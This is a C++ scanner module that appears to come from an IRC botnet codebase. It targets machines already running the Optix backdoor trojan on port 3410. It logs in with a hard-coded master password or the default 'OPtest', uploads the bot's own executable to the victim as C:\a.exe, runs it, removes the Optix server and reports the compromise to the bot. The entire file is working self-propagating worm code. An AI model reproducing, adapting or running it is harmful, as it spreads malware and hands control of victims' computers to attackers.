#include "main.h"
#include "mainctrl.h"
#include "utility.h"

class CScannerOptix :
	public CScannerBase
{
/*
 -----------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------
 */
public:
	CScannerOptix(void);
	virtual ~CScannerOptix()
	throw()
	{
	}
	bool	Exploit(void);

};

#define OPTIX_DEFAULT_PORT	3410


CScannerOptix::CScannerOptix(void)
{
	m_szType = "CScannerOptix";
	m_sScannerName.Assign("Optix");
}
//kjui3498fjk34289890fwe334gfew4ger$"sdf
//sprintf(szBuffer, "022¬OPtest¬v1.1\r\n"); //OPtest = Default Password, 1.1 Server
bool CScannerOptix::Exploit(void)
{
	char szBuffer[64], szFilePath[MAX_PATH];

	int read = 0;
	bool IS11 = FALSE;

	start:
	if(!m_sSocket.Connect(m_sSocket.m_szHost, OPTIX_DEFAULT_PORT))	/* Connect failed, exit */
	{ return false; }

	//Auth
	//Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
	if (IS11 == TRUE) 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.1\r\n"); //OPtest = Default Password, 1.1 Server
	else 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.2\r\n"); //OPtest = Default Password, 1.2 Server
	if(!m_sSocket.Write(szBuffer, strlen(szBuffer))) { m_sSocket.Disconnect(); return false; }
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);
	//1.1 Check
	if (strstr(szBuffer, "001¬Your client version is outdated!") != NULL) { //1.1 Server
		IS11 = TRUE;
		m_sSocket.Disconnect();
		goto start;
	}
	//All Others
	if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
		Sleep(500);
		

		// ok master pass didnt work lets try default even thow i dont know why
		if (IS11 == TRUE) 
			sprintf(szBuffer, "022¬OPtest¬v1.1\r\n"); //NULL Password, 1.1 Server
		else 
			sprintf(szBuffer, "022¬OPtest¬v1.2\r\n"); //NULL Password, 1.2 Server
		if(!m_sSocket.Write(szBuffer, strlen(szBuffer))) { m_sSocket.Disconnect(); return false; }
		Sleep(500);

		memset(szBuffer, 0, sizeof(szBuffer));
		m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);
		if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
			m_sSocket.Disconnect();
			return FALSE;
		}
	}

	//Prepare Optix For Upload
	if(!m_sSocket.Write("019¬\r\n", 6)) { m_sSocket.Disconnect(); return false; }
	//fsend(opxsock, "019¬\r\n", 6, 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);
	if (strcmp(szBuffer, "020¬\r\n") != 0) {
		m_sSocket.Disconnect();
		return FALSE;
	}

	//Get FilePath
	memset(szFilePath, 0, sizeof(szFilePath));
	GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
	//sprintf(szFilePath, szLocalPayloadFile);

	//Open File
	FILE *f = fopen(szFilePath, "rb");
	if (f == NULL) {	
		m_sSocket.Disconnect();
		return FALSE;
	}

	CSocket outSocket;
	if(!outSocket.Connect(m_sSocket.m_szHost, 500)) // Connect failed, exit
	{ m_sSocket.Disconnect(); return false; }
	
	//Send File Info (Where To Upload And Size..)
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	DWORD dwSize = GetFileSize(hFile, 0);
	CloseHandle(hFile);

	sprintf(szBuffer, "C:\\a.exe\r\n%d\r\n", dwSize);
	if(!outSocket.Write(szBuffer, strlen(szBuffer))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	if(!outSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	//OK REDY Received, Upload File..
	if (strstr(szBuffer, "+OK REDY") == NULL) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	//Upload \o/
	memset(szBuffer, 0, sizeof(szBuffer));
	while (!feof(f)) {
		read = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
		if(!outSocket.Write(szBuffer, read)) {
			m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }
	}

	memset(szBuffer, 0, sizeof(szBuffer));
	if(!outSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	//Execute File If Upload Success
	if (strstr(szBuffer, "+OK RCVD") != NULL) {
		outSocket.Disconnect();
		if(!m_sSocket.Write("008¬C:\\a.exe\r\n", 14)) { m_sSocket.Disconnect(); return false; }
		Sleep(500);

		memset(szBuffer, 0, sizeof(szBuffer));
		m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);
		if (strcmp(szBuffer, "001¬Error Executing File\r\n") == 0) {
			outSocket.Disconnect();
			m_sSocket.Disconnect();
			return FALSE;
		}
	} else {
		outSocket.Disconnect();
		m_sSocket.Disconnect();
		return FALSE;
	}

	//Remove Optix Server
	if(!m_sSocket.Write("100¬\r\n", 6)) { m_sSocket.Disconnect(); return false; }
	outSocket.Disconnect();
	m_sSocket.Disconnect();

	if(g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	return true;
}

REGSCANNER(Optix_3410, Optix, 3410, true, true)